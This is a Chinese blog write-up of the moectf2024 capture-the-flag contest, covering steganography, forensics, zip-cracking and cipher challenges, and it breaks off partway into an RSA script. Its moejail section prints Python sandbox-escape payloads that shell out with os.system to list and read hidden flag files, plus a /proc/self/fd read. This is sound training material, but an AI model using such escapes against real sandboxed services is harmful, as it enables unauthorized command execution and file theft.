

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="个人排名第25，后期就没怎么打了，复盘整理一下。  0基础入门 看完pdf，在群里输入识别码，获得flag   安全杂项  signin 登入网址，按照要求，给luo选择缺勤，其他签到 注意：完成所有要求再提交  罗小黑战记 打开发现是GIF，帧数藏图片，用工具提取内容    最后扫码得到 moectf{y0uu6r3th3m0st3r1nth1sf13ld}  杂项入门指北 得到海豹图片，尝试多">
<meta property="og:type" content="article">
<meta property="og:title" content="moectf2024">
<meta property="og:url" content="https://0ran9ewww.github.io/2024/10/12/moectf/moectf2024/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="个人排名第25，后期就没怎么打了，复盘整理一下。  0基础入门 看完pdf，在群里输入识别码，获得flag   安全杂项  signin 登入网址，按照要求，给luo选择缺勤，其他签到 注意：完成所有要求再提交  罗小黑战记 打开发现是GIF，帧数藏图片，用工具提取内容    最后扫码得到 moectf{y0uu6r3th3m0st3r1nth1sf13ld}  杂项入门指北 得到海豹图片，尝试多">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/images/moectf/moectf2024/back.png">
<meta property="article:published_time" content="2024-10-12T14:00:00.000Z">
<meta property="article:modified_time" content="2024-12-04T15:31:35.427Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/images/moectf/moectf2024/back.png">
  
  
  
  <title>moectf2024 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://0ran9e.fun","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/../../images/moectf/moectf2024/back.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="moectf2024"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-10-12 22:00" pubdate>
          2024年10月12日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          65 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">moectf2024</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2024年12月4日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>个人排名第25，后期就没怎么打了，复盘整理一下。</p>
<h1 id="0基础入门"><a class="markdownIt-Anchor" href="#0基础入门"></a> 0基础入门</h1>
<p>看完pdf，在群里输入识别码，获得flag</p>
<p><img src="/../../images/moectf/moectf2024/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<h1 id="安全杂项"><a class="markdownIt-Anchor" href="#安全杂项"></a> 安全杂项</h1>
<h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> signin</h2>
<p>登入网址，按照要求，给luo选择缺勤，其他签到</p>
<p>注意：完成所有要求再提交</p>
<h2 id="罗小黑战记"><a class="markdownIt-Anchor" href="#罗小黑战记"></a> 罗小黑战记</h2>
<p>打开发现是GIF，帧数藏图片，用工具提取内容</p>
<img src="/../../images/moectf/moectf2024/a.jpeg" srcset="/img/loading.gif" lazyload alt="a" style="zoom:50%;">
<img src="/../../images/moectf/moectf2024/b.jpeg" srcset="/img/loading.gif" lazyload alt="b" style="zoom:50%;">
<img src="/../../images/moectf/moectf2024/c.png" srcset="/img/loading.gif" lazyload alt="c" style="zoom:75%;">
<p>最后扫码得到 <strong>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</strong></p>
<h2 id="杂项入门指北"><a class="markdownIt-Anchor" href="#杂项入门指北"></a> 杂项入门指北</h2>
<p>得到海豹图片，尝试多种未果，注意到图片观察。其实有一段莫斯密码</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/moectf/moectf2024/haibao.png" srcset="/img/loading.gif" lazyload alt="haibao"></p>
<p><strong>moectf{H4VE_A_G00D_T1ME}</strong></p>
<h2 id="ez_f5"><a class="markdownIt-Anchor" href="#ez_f5"></a> ez_F5</h2>
<p>头一次见这种隐写</p>
<p>先看到属性里面有编码，base32解密得到<code>no_password</code>,010打开进行分析，在里面看到提示</p>
<p><img src="/../../images/moectf/moectf2024/F5.png" srcset="/img/loading.gif" lazyload alt="F5"></p>
<p>网上搜索一下是F5隐写，下载工具，上面的是密码得到flag</p>
<p><img src="/../../images/moectf/moectf2024/F5-1.png" srcset="/img/loading.gif" lazyload alt="F5-1"></p>
<p><strong>moectf{F5_15_s0_lntere5t1n9}</strong></p>
<h2 id="so-many-m"><a class="markdownIt-Anchor" href="#so-many-m"></a> so many ‘m’</h2>
<p>字频统计的题目，写一个脚本出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_frequency_sort</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># 统计每个字符的频率</span><br>    frequency = Counter(text)<br><br>    <span class="hljs-comment"># 按照频率从高到低排序，如果频率相同则按字典序排序</span><br>    sorted_chars = <span class="hljs-built_in">sorted</span>(frequency.items(), key=<span class="hljs-keyword">lambda</span> x: (-x[<span class="hljs-number">1</span>], x[<span class="hljs-number">0</span>]))<br><br>    <span class="hljs-comment"># 拼接成排序后的字符序列</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span>.join(char <span class="hljs-keyword">for</span> char, count <span class="hljs-keyword">in</span> sorted_chars)<br><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-comment"># 测试输入</span><br>text = <span class="hljs-string">&quot;a!&#123;ivlotzkEm&#123;CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC&#125;sii&#125;tkb&#125;ugCD&#123;zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC&#125;eot#dcf&#123;ec@ccgqpfqMycysMuuou!en#&#123;g0cDmoyxTCMgt&#123;joT&#123;jnl0rhoklCe&#123;n0CnxprydeaTg0r&#123;avkEjckjEsxhaohs&#123;Trbkr!ffqip444uwrc&#125;nnevgtCT&#123;jCipogtipzdeDiqsy44rMfj&#123;MzCw#qwg&#123;T4m&#123;cuk!hwuncxdmddeurtsojakrjC#vTDd&#125;0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq&#125;kcf#Mpcam&#123;mml4i4mpDnedamcwtC0nem&#123;mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu&#123;poeTEhD!u0anvTTTbbi&#123;q&#125;zapcksMifDlovoeac@&#123;0keh0dg&#123;Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE&#125;eoD&#123;xcMnoCuebu0otdusiDknfvo0&#123;fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a&#125;0ixeEktws&#125;pMCfCigaTafg&#125;ffssmwwuTkTuls0&#123;M@c4e@&#123;D&#123;tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo&#123;et4kcCpcgcT&#125;vD&#125;m!g4&#123;E0!Mol0fpo!&#123;srT0pf&#123;cMuCx0bp&#123;ftTmExcrn&#125;0etonez!@C4tfa4aM00siztb@fomfD#&#123;#tMbo@jgb4CM0dEk0tea4aMCafn&quot;</span><br><br><span class="hljs-comment"># 获取结果并输出</span><br>result = char_frequency_sort(text)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>
<h2 id="捂住一只耳"><a class="markdownIt-Anchor" href="#捂住一只耳"></a> 捂住一只耳</h2>
<p>wav音频，先用audi代开，没发现波纹图的问题，大约在1min的时候会有数字读写，看了hint才猜出，按键盘上字母对应的列行，如63就是字母第六列第三行，即n</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">63 </span><span class="hljs-number">31</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">52</span> <span class="hljs-number">31</span> <span class="hljs-number">51</span> <span class="hljs-number">71</span> <span class="hljs-number">101</span><br></code></pre></td></tr></table></figure>
<p>最后的flag为moectf{nevergetup}</p>
<h2 id="abnormal-lag"><a class="markdownIt-Anchor" href="#abnormal-lag"></a> Abnormal lag</h2>
<p>这里用adu打开发现多频图里面有内容，需要进行观察得到flag，友情提醒的是字符只有a-f和数字</p>
<p><img src="/../../images/moectf/moectf2024/lag1.png" srcset="/img/loading.gif" lazyload alt="lag1"></p>
<p><img src="/../../images/moectf/moectf2024/lag2.png" srcset="/img/loading.gif" lazyload alt="lag2"></p>
<p>尝试后得到moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p>
<h2 id="moejail_lv1"><a class="markdownIt-Anchor" href="#moejail_lv1"></a> moejail_lv1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>读取文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat /tmp/.therealflag_*&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="moejail_lv2"><a class="markdownIt-Anchor" href="#moejail_lv2"></a> moejail_lv2</h2>
<p>用1一样的第一条先查看一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls -al /tmp&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>发现root权限可以看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918&#x27;</span>).read())<br></code></pre></td></tr></table></figure>
<h2 id="moejail_lv3"><a class="markdownIt-Anchor" href="#moejail_lv3"></a> moejail_lv3</h2>
<p>试了一下lv3,用2的代码可以打通，就不多赘述了</p>
<h2 id="the-upside-and-down"><a class="markdownIt-Anchor" href="#the-upside-and-down"></a> The upside and down</h2>
<p>010发现是逆转，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># # 以二进制模式读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/a.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>     content = f.read()<br><br> <span class="hljs-comment"># 反转文件内容</span><br>reversed_content = content[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/new.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>      new_file.write(reversed_content)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br>lines = [line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines <span class="hljs-keyword">if</span> line.strip()]<br><br><span class="hljs-comment"># 将过滤后的内容写回文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;new.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.writelines(lines)<br><br></code></pre></td></tr></table></figure>
<p>扫一下得到flag</p>
<p><img src="/../../images/moectf/moectf2024/new.png" srcset="/img/loading.gif" lazyload alt="new"></p>
<p><strong>https://balabala_towards:moectf{Fri3nds_d0n’t_lie!}//</strong></p>
<h2 id="the_secret_of_snowball"><a class="markdownIt-Anchor" href="#the_secret_of_snowball"></a> the_secret_of_snowball</h2>
<p>010打开开头改为FFD8，</p>
<p>得到第一段</p>
<p>第二段在010底部base64解密拼接得到flag</p>
<h2 id="解不完的压缩包"><a class="markdownIt-Anchor" href="#解不完的压缩包"></a> 解不完的压缩包</h2>
<p>先写脚本得到最后一层压缩包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_zip_file</span>(<span class="hljs-params">zip_name, output_dir</span>):<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>        zipf.extractall(output_dir)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    output_dir = <span class="hljs-string">&quot;.&quot;</span>  <span class="hljs-comment"># 使用当前目录进行解压</span><br>    prev_extracted_file = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        zip_name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.zip&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(zip_name):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: The file &#x27;<span class="hljs-subst">&#123;zip_name&#125;</span>&#x27; does not exist.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># Extract the current zip file</span><br>        extract_zip_file(zip_name, output_dir)<br><br>        <span class="hljs-keyword">if</span> prev_extracted_file:<br>            <span class="hljs-comment"># Delete the previously extracted zip file</span><br>            os.remove(prev_extracted_file)<br><br>        prev_extracted_file = zip_name<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All zip files have been extracted and processed.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<p>根据压缩包名称的提示，crc碰撞</p>
<p>利用Zipcrack.py进行爆破</p>
<p>得到key    *<strong>m:#P7j0</strong></p>
<p>最后解密得到flag</p>
<p><strong>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</strong></p>
<h2 id="每人至少300份"><a class="markdownIt-Anchor" href="#每人至少300份"></a> 每人至少300份</h2>
<p>一直在想脚本没看图片，然后利用word文档就行了简单的拼接，扫码得到一串字符,分析一会后发现了是base58加密得到了flag这题之后会有修复题</p>
<p><img src="/../../images/moectf/moectf2024/300%E9%97%AE%E5%8D%B7.png" srcset="/img/loading.gif" lazyload alt="300问卷"></p>
<p>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??</p>
<p>key里面的内容进行解密得到flag.</p>
<h2 id="readme"><a class="markdownIt-Anchor" href="#readme"></a> readme</h2>
<p><code>/proc/self/fd/3</code></p>
<h2 id="find-it"><a class="markdownIt-Anchor" href="#find-it"></a> Find It</h2>
<p>orz这题历时写了很长时间，总结就是其实和图片没什么关系，直接看hint</p>
<p>做题流程：豆包搜索西安带&quot;的&quot;的幼儿园，跳出了吉的堡幼儿园，简单的百度地图搜一下几个位置，发现有个小区有两个吉的堡幼儿园，最后拼写的就是moectf{ji_di_bao_you_er_yuan}</p>
<h2 id="ez_forensics"><a class="markdownIt-Anchor" href="#ez_forensics"></a> ez_Forensics</h2>
<p>取证这一块我没这么了解过</p>
<p>按流程正常输入一些内容就行(毕竟这个比较简单)</p>
<p>拖入虚拟机使用vol</p>
<p>常见的先看看什么镜像</p>
<p><code>vol.py -f ../flag.raw imageinfo</code></p>
<p>得到镜像折后可以看一下进程</p>
<p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 pslist</code></p>
<p>可以注意到cmd.exe，根据题目的提示，我们需要得到cmd里面的flag</p>
<p>进行cmdscan扫描</p>
<p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan</code></p>
<p>得到了flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">CommandProcess: conhost.exe Pid: 2268<br>CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 3 LastAdded: 2 LastDisplayed: 2<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x330410: echo moectf&#123;WWBGY-TLVC5-XKYBZ&#125; &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#1 @ 0x30cec0: echo SJW7O^%gt8 &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#2 @ 0x3350b0: del flag.txt</span><br>**************************************************<br></code></pre></td></tr></table></figure>
<h2 id="ctfer20771"><a class="markdownIt-Anchor" href="#ctfer20771"></a> ctfer2077①</h2>
<p>先扫看看发现没有东西，用steg看一下，发现有一处有一串内容，data分析一下得到flag</p>
<p><img src="/../../images/moectf/moectf2024/ctfer2077-1.png" srcset="/img/loading.gif" lazyload alt="ctfer2077-1"></p>
<p>moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}</p>
<h2 id="ctfer20772"><a class="markdownIt-Anchor" href="#ctfer20772"></a> ctfer2077②</h2>
<p>加密卷用veracrpt进行解密，然后使用DiskGenius进行恢复文件得到一段内容，打开发现没有明显的内容，估计是被删了，去修复一下。有一个小鹤.txt的文件，内容是</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">ulpb vfde hfyz yisi buuima<br>key jqui xxmm vedrhx de qrpb xnxp<br>ulpb ui veyh dazide<br></code></pre></td></tr></table></figure>
<p>经过分析是双拼打的字，进行简单分析得到key</p>
<p>shuangpinshizheyangdazide</p>
<p>加个moectf就是flag</p>
<h2 id="ctfer20773"><a class="markdownIt-Anchor" href="#ctfer20773"></a> ctfer2077③</h2>
<p>流量包导出内容，然后upload文件利用foremost解开得到压缩包，解压得到一些文件。</p>
<p>有个gif动图隐约能看见有字提取一下内容，得到key:C5EZFsC6</p>
<p>正常用aud打开发现没什么内容，注意是MP3文件，尝试用MP3stego解密</p>
<p><img src="/../../images/moectf/moectf2024/mp3.png" srcset="/img/loading.gif" lazyload alt="mp3"></p>
<p>得到了文件，是brainfuck转text的内容，得到了字符串H5gHWM9b</p>
<p>解开压缩包是3个txt文件，缩小观察是福尔摩斯小人，上图片</p>
<p><img src="/../../images/moectf/moectf2024/%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF.png" srcset="/img/loading.gif" lazyload alt="福尔摩斯"></p>
<p>挨个对应然后输入就是以下字符串，最后套个moectf{}</p>
<p>people_dancing_happily</p>
<h1 id="现代密码学"><a class="markdownIt-Anchor" href="#现代密码学"></a> <strong>现代密码学</strong></h1>
<h2 id="现代密码学入门指北"><a class="markdownIt-Anchor" href="#现代密码学入门指北"></a> 现代密码学入门指北</h2>
<p>根据文本写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">197380555956482914197022424175976066223</span><br>q = <span class="hljs-number">205695522197318297682903544013139543071</span><br>n = <span class="hljs-number">40600296529065757616876034307502386207424439675894291036278463517602256790833</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">36450632910287169149899281952743051320560762944710752155402435752196566406306</span><br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算解密指数 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># 解密密文 c 得到明文 m</span><br>m = <span class="hljs-built_in">pow</span>(c, 